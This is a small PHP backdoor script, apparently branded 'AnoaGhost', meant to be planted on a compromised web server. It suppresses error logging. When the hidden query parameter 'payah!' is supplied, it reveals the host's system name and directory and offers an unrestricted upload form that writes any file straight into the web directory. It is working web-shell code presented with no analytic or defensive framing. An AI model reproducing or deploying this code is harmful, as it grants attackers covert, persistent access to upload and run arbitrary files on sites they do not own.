<?php 
error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);

if(isset($_GET['payah!']))
{
$web = $_SERVER["HTTP_HOST"];
 $inj = $_SERVER["REQUEST_URI"];
 $body = "AnoaGhost \nUname: ".php_uname()."\nPath Dir:
".$cwd = getcwd()."\nMessage:\n"."\nE-server: ".htmlspecialchars
($_SERVER['REQUEST_URI'])."\nE-server2: ".htmlspecialchars ($_SERVER["SERVER_NAME"])."\n\nIP: 
";
echo '<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); 
echo '
<center>
<form method="post" target="_self" enctype="multipart/form-data"> 
<input type="file" size="20" name="uploads" /> <input type="submit" value="upload" /> </form>  </center></td></tr> </table><br>';
 if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']); 
 echo "<b>Uploaded !!!</b><br>name : <a href='".$_FILES['uploads']['name']."'>".$_FILES['uploads']['name']."</a><br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } 
}
 ?>